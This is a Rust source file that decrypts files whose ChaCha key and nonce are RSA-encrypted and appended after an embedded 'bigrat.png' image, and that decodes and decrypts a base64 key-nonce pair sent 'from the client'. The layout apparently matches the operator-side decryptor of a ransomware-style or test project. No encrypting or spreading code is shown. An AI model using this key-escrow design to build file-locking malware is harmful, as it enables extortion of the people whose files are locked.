use std::{fs, env};
use std::fs::File;
use std::io::{Read, Seek, SeekFrom, Write};
use std::io::ErrorKind::NotFound;
use std::path::PathBuf;
use std::process::{Command, exit};
use anyhow::{Context, Result};
use base64::Engine;
use rand::Rng;
use rsa::pkcs8::DecodePrivateKey;
use rsa::{Oaep, RsaPrivateKey};
use sha2::Sha512;
use decryptor::decrypt_file_chacha;

const BIGRAT_SIZE: usize = include_bytes!("../../bigrat.png").len();

fn decrypt_key_nonce(
    key_encrypted: &[u8],
    nonce_encrypted: &[u8],
    private_key_path: PathBuf
) -> Result<([u8; 32], [u8; 19])> {
    let private_key = fs::read(private_key_path)?;
    let private_key = RsaPrivateKey::from_pkcs8_der(private_key.as_slice())?;

    let key = private_key.decrypt(Oaep::new::<Sha512>(), key_encrypted)
        .with_context( ||
            "Error decrypting the key, make sure you supplied the correct \
            encrypted key and private decryption key"
        )?;

    let nonce = private_key.decrypt(Oaep::new::<Sha512>(), nonce_encrypted)
        .with_context( ||
            "Error decrypting the nonce, make sure you supplied the correct \
            encrypted key and private decryption key"
        )?;

    Ok((
        <[u8; 32]>::try_from(key.as_slice())?,
        <[u8; 19]>::try_from(nonce.as_slice())?,
    ))
}

fn decrypt_key_nonce_from_file(mut file: &File, private_key_path: PathBuf) -> Result<([u8; 32], [u8; 19])> {
    file.seek(SeekFrom::Start(BIGRAT_SIZE as u64))?;

    let mut key_encrypted = [0u8; 256];
    file.read_exact(&mut key_encrypted)?;

    let mut nonce_encrypted = [0u8; 256];
    file.read_exact(&mut nonce_encrypted)?;

    decrypt_key_nonce(&key_encrypted, &nonce_encrypted, private_key_path)
}

pub fn decrypt_file(
    file_path: PathBuf,
    private_key: PathBuf,
    output_path: Option<PathBuf>,
) -> Result<()> {
    let file = File::open(&file_path)?;
    let (key, nonce) = decrypt_key_nonce_from_file(&file, private_key)?;

    let dist_path = if let Some(output_path) = output_path {
        output_path
    } else {
        file_path.with_file_name(
            "decrypted-".to_string() + &file_path.file_name().unwrap().to_string_lossy()
        )
    };
    decrypt_file_chacha(&file, dist_path, key, nonce)
}

macro_rules! editor_error {
    ($editor:ident, $err:ident, $editor_err:ident) => {
        eprintln!("Error running editor {}: {}", $editor, $err);
        $editor_err = true;
        continue;
    }
}

pub fn decrypt_pair(key_path: PathBuf, pair: Option<String>) -> Result<()> {
    let pair_base64 = if let Some(pair) = pair {
        pair
    } else {
        let mut rng = rand::thread_rng();
        let temp_file_path = loop {
            let path = env::temp_dir().join(
                "decrypt-pair-".to_owned() + rng.gen::<u32>().to_string().as_str()
            );
            match path.try_exists() {
                Ok(exists) => if !exists { break path }
                Err(err) => return Err(err).with_context( ||
                    "Error creating a temporary file \
                    \nPlease use a --pair <PAIR> argument instead"
                )
            };
        };
        let mut temp_file = File::create(&temp_file_path)
            .with_context( ||
                "Error creating a temporary file \
                \nPlease use a --pair <PAIR> argument instead"
            )?;
        temp_file.write_all(b"\n#\n# Paste the base64-encoded encrypted key-nonce pair from the client\
                              \n# Lines starting with a hashtag are ignored")?;

        let mut editors = vec!["nano".to_string(), "nvim".to_string(), "vim".to_string(), "vi".to_string()];
        if let Ok(editor) = env::var("EDITOR") {
            editors.insert(0, editor);
        };
        let mut editor_err = false;
        let mut did_edit = false;
        for editor in editors {
            match Command::new(&editor).arg(&temp_file_path).spawn() {
                Ok(mut child) => {
                    match child.wait() {
                        Ok(exit_status) => {
                            if !exit_status.success() {
                                eprintln!("Command {} did not exit successfully: {}", editor, exit_status);
                                editor_err = true;
                                continue;
                            }
                        }
                        Err(err) => { editor_error!(editor, err, editor_err); }
                    }
                    editor_err = false;
                    did_edit = true;
                    break;
                }
                Err(err) => {
                    if err.kind() != NotFound {
                        editor_error!(editor, err, editor_err);
                    }
                }
            }
        }
        if !did_edit && !editor_err {
            eprintln!("No text editor found. Please set the EDITOR environment variable, \
                       or pass a key-nonce pair as command argument");
            exit(1);
        } else if !did_edit && editor_err {
            eprintln!("No usable text editor found. To use a different editor, \
                       please set the EDITOR environment variable, \
                       or pass a key-nonce pair as a command argument");
            exit(1);
        }

        let mut pair_base64_raw = String::new();
        File::open(&temp_file_path)?.read_to_string(&mut pair_base64_raw)?;
        fs::remove_file(&temp_file_path)
            .with_context(|| format!("Failed to remove a temporary file {:?}", &temp_file_path))?;

        let mut pair_base64 = String::new();
        pair_base64_raw.lines().for_each(|line| {
            if !line.starts_with('#') {
                pair_base64 += line.trim();
            }
        });
        pair_base64
    };

    let mut pair = [0u8; 512];
    // Ignoring trailing bits, because of the nature of base64
    // https://github.com/marshallpierce/rust-base64#i-want-canonical-base64-encodingdecoding
    base64::engine::general_purpose::STANDARD_NO_PAD.decode_slice_unchecked(pair_base64, &mut pair)
        .with_context(|| "Error decoding base64 of encrypted key-nonce pair")?;

    let (key, nonce) = decrypt_key_nonce(&pair[..256], &pair[256..], key_path)
        .with_context(|| "Error decrypting the key-nonce pair")?;

    let pair_decoded_b64 = base64::engine::general_purpose::STANDARD_NO_PAD.encode(
        key.iter().copied().chain(nonce.iter().copied()).collect::<Vec<u8>>()
    );
    println!("{}", &pair_decoded_b64);

    Ok(())
}
